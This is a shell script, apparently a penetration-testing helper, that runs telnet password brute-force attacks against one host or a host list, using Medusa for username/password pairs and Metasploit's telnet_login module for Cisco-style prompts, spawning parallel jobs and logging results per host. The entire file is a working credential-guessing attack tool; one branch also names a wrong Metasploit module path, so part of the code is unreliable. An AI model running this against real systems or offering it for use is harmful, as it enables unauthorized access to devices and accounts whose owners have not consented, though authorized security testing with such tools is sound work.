#!/bin/sh

ShowUsage() {
	echo ""
	echo "Usage: $0 [--cisco] [--hostfile=<file> | --host=<host>] [--userfile=<userfile> | --userid=<user>] <--passwordfile=<passwordfile>"
	echo "$0 will attempt to dictionary attack telnet sessions, either with user/pass pairs"
	echo "or Cisco telnet prompts."
	echo ""
	echo "Required:"
	echo "--host=<host>]        IP address of single system to attack"
	echo "--passwordfile=<passwordfile>  Password file to use"
	echo ""
	echo "Optional:"
	echo "--cisco               Assume Cisco telnet login (otherwise use standard telnet username/password)"
	echo "                      Note: This leverages metasploit for Cisco attacks"
	echo "--hostfile=<file>     File with list of IP's to attack instead of a single host"
	echo "--help                Usage information."
	echo ""
	echo "One of the following is required if not using Cisco telnet:"
	echo "--userid=<user>       Single user id to try"
	echo "--userfile=<userfile> File with list of usernames to attempt"
}

if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

ISCISCO=0
HOSTFILE=""
HOST=""
PASSWORDFILE=""
USERNAME=""
USERFILE=""

for i in $*
do
	case $i in
	--host=*)
		HOST=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--hostfile=*)
		HOSTFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--cisco)
		ISCISCO=1
	;;
	--passwordfile=*)
		PASSWORDFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--userid=*)
		USERNAME=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--userfile=*)
		USERFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--help | *)
		ShowUsage
		exit 1
	;;
	esac
done

# Sanity check...
if [ ${#HOST} -eq 0 -a ${#HOSTFILE} -eq 0 ]; then
	echo "ERROR: Please specify either a host or a host file."
	exit 2
fi

if [ $ISCISCO -eq 0 -a ${#USERNAME} -eq 0 -a ${#USERFILE} -eq 0 ]; then
	echo "ERROR: Please specify either a user name or a user name file."
	exit 2
fi

if [ ${#PASSWORDFILE} -eq 0 ]; then
	echo "ERROR: Please specify a password file."
	exit 2
fi

if [ ! -e $PASSWORDFILE ]; then
	echo "ERROR: file $PASSWORDFILE could not be found."
	exit 3
fi

# if [ ! -e /opt/cisco/Cisco_Crack.pl ]; then
#	echo "Please downlaod or copy Cisco_Crack.pl to /opt/cisco."
#	echo "This will require the Perl Cisco add-on: sudo apt-get -y install libnet-telnet-cisco-perl"
#	echo "Or PPM install Net::Telnet::Cisco under cygwin."
#	echo "Note: Only the Cisco telnet module will work under cygwin as medusa will not"
#	echo "run under cygwin."
#	exit 4
# fi

which msfconsole > /dev/null 

if [ $? -gt 0 ]; then
	if [ $ISCISCO -eq 1 ]; then
		echo "ERROR: This module requires metasploit."
	
		exit 4
	fi
fi

# Okay, now we're ready to go.
if [ ${#USERFILE} -gt 0 ]; then
	USERPARAM="-U $USERFILE"
else
	USERPARAM="-u $USERNAME"
fi

if [ $ISCISCO -eq 1 ]; then
	# Hydra Cisco
	# Will get ">" or "#" in prompt if login is successful.
	/opt/cisco/Cisco_Crack.pl -h $HOST -p $PASSWORDFILE
else
	# Medusa telnet
	echo "Running tests..."
	# -F = stop after finding combo
	# -e ns = try blank and name
	
	if [ ${#HOSTFILE} -gt 0 ]; then
		HOSTLIST=`cat $HOSTFILE | grep -v "^$" | grep -v "^#"`
	else
		HOSTLIST=$HOST
	fi

	NUMHOSTS=`echo "$HOSTLIST" | wc -l`

	for CURHOST in $HOSTLIST
	do
		OUTPUTFILE=`echo "$CURHOST.crack.telnet.txt"`

		DATESTR=`date`

		HOSTPARAM="-h $CURHOST"

		if [ $NUMHOSTS -gt 1 ]; then
			# Parallelizing scans
			echo "[$DATESTR] Spawning telnet brute force for $CURHOST with $PASSWORDFILE [output to $OUTPUTFILE]..."
			echo "[$DATESTR] Spawning telnet brute force for $CURHOST with $PASSWORDFILE..." > $OUTPUTFILE

			if [ $ISCISCO -eq 1 ]; then
				# metasploit's telnet module will auto-detect if this is a Cisco / pwd only
				msfconsole -x "use auxiliary/scanner/telnet/telnet_login; set RHOSTS $CURHOST; set PASS_FILE $PASSWORDFILE; set THREADS 3; exploit; exit" > $OUTPUTFILE &

				# This single-threaded perl script with a single output file was just too slow.
#				/opt/cisco/Cisco_Crack.pl -p $PASSWORDFILE -h $CURHOST > $OUTPUTFILE
			else
				medusa $HOSTPARAM $USERPARAM -P $PASSWORDFILE -M telnet -e ns -F > $OUTPUTFILE &
			fi
		else
			# Run single
			echo "[$DATESTR] Running telnet brute force for $CURHOST with $PASSWORDFILE [output to $OUTPUTFILE]..."
			echo "[$DATESTR] Running telnet brute force for $CURHOST with $PASSWORDFILE..." > $OUTPUTFILE

			if [ $ISCISCO -eq 1 ]; then
				# metasploit's telnet module will auto-detect if this is a Cisco / pwd only
				msfconsole -x "use auxiliary/scanner/ssh/telnet_login; set RHOSTS $CURHOST; set PASS_FILE $PASSWORDFILE; set THREADS 3; exploit; exit" > $OUTPUTFILE

				# This single-threaded perl script with a single output file was just too slow.
#				/opt/cisco/Cisco_Crack.pl -p $PASSWORDFILE -h $CURHOST > $OUTPUTFILE
			else
				medusa $HOSTPARAM $USERPARAM -P $PASSWORDFILE -M telnet -e ns -F > $OUTPUTFILE
			fi

			DATESTR=`date`
			echo "[$DATESTR] Scan completed.  See $OUTPUTFILE for results."
			echo "[$DATESTR] Scan completed." >> $OUTPUTFILE
		fi
	done
fi

